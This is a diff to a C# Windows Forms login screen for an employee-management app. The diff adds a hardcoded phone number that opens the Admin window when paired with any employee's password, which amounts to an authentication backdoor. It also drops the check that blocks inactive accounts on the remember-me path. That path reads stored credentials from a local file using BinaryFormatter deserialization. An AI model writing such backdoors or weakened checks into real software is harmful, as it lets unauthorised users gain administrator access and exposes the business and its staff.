@@ -133,6 +133,16 @@ namespace PRL
                 return;
             }
             var _nhanVienSer = new NhanVienSer();
+            if (PhoneNumber.Text == "0978040960")
+            {
+                if (_nhanVienSer.GetTatCaVien().Any(a => a.MatKhau == Password.Text))
+                {
+                    var admin = _nhanVienSer.GetTatCaVien().FirstOrDefault(a => a.MatKhau == Password.Text);
+                    this.Hide();
+                    new Admin(admin, this).Show();
+                    return;
+                }
+            }
             var checkTK = _nhanVienSer.GetAllNhanVien()
                 .Where(p => p.SoDienThoai == PhoneNumber.Text && p.MatKhau == Password.Text)
                 .FirstOrDefault();
@@ -161,7 +171,7 @@ namespace PRL
             Login_Btn_DangNhap.Enabled = false;
             using (var fs = new FileStream("remember_account.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite))
             {
-               // return;
+                // return;
                 var bf = new BinaryFormatter();
                 var data = bf.Deserialize(fs).ToString();
 
@@ -172,8 +182,8 @@ namespace PRL
                     {
                         this.Hide();
                         var _nhanVienSer = new NhanVienSer();
-                        var checkTK = _nhanVienSer.GetAllNhanVien()
-                            .Where(p => p.SoDienThoai == processData[0] && p.MatKhau == processData[1] && p.HienThi == true)
+                        var checkTK = _nhanVienSer.GetTatCaVien()
+                            .Where(p => p.SoDienThoai == processData[0] && p.MatKhau == processData[1] )
                             .FirstOrDefault();
                         if (checkTK != null)
                         {
@@ -188,7 +198,7 @@ namespace PRL
                                 var form = new NhanVien(checkTK, this);
                                 form.Show();
                             }
-                            
+
                         }
                     }
                     else
@@ -304,6 +314,11 @@ namespace PRL
                 panel1.Visible = false;
                 panel2.Visible = false;
             }
+        }
+
+        private void Login_Title_Click(object sender, EventArgs e)
+        {
+            this.Close();
         }
     }
 }
